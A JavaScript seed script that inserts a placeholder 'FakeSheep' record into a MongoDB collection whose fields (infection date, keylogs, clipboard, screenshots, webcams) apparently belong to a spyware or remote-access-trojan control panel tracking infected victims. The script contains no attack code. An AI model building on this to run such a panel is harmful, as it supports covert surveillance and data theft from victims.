import Sheep from '../../../mongo/models/sheep';
import clc from 'cli-color';

const createDefaultSheep = async () => {
    try {
        // Vérifiez s'il existe des sheep dans la base de données
        const existingSheep = await Sheep.findOne();

        // S'il n'y a aucun sheep, en créer un par défaut
        if (!existingSheep) {
            const newSheep = new Sheep({
                name: "FakeSheep",
                ip: "192.168.1.1",
                region: "Europe",
                webcams: ["webcam1", "webcam2"],
                screenshots: ["screenshot1", "screenshot2"],
                infectionDate: new Date(),
                keylog: [
                    { keylogDate: "2023-05-27T08:30:00Z", data: "keylog data" }
                ],
                clipboard: [
                    { clipboardDate: "2023-05-27T08:30:00Z", data: "clipboard data" }
                ],
                screenshot: [
                    { screenshotDate: "2023-05-27T08:30:00Z", file: "some binary data" }
                ],
                devices: ["device1", "device2"],
                hardware: {
                    cpu: "Intel i7",
                    ram: "16GB",
                    storage: "512GB SSD",
                    gpu: "NVIDIA GTX 1080"
                },
                os: {
                    name: "Windows",
                    version: "10"
                }
            });

            await newSheep.save();
            // Affichez les informations du sheep par défaut dans la console avec stylisation
            const highlight = clc.bgRedBright.white.bold;
            const boxWidth = 50;
            const boxLine = highlight('+' + '-'.repeat(boxWidth) + '+');
            const emptyLine = highlight('|' + ' '.repeat(boxWidth) + '|');
            const nameLine = highlight(`| Name: ${newSheep.name.padEnd(boxWidth - 8)} |`);
            const ipLine = highlight(`| IP: ${newSheep.ip.padEnd(boxWidth - 6)} |`);
            const regionLine = highlight(`| Region: ${newSheep.region.padEnd(boxWidth - 10)} |`);

            console.log();
            console.log('[✓]' + clc.cyan(' Default sheep created successfully. Here are the details:\n'));
            console.log(boxLine);
            console.log(emptyLine);
            console.log(nameLine);
            console.log(ipLine);
            console.log(regionLine);
            console.log(emptyLine);
            console.log(boxLine);
        }
    } catch (error) {
        console.error('An error occurred while checking/creating the default sheep:', error);
    }
};

export default createDefaultSheep;
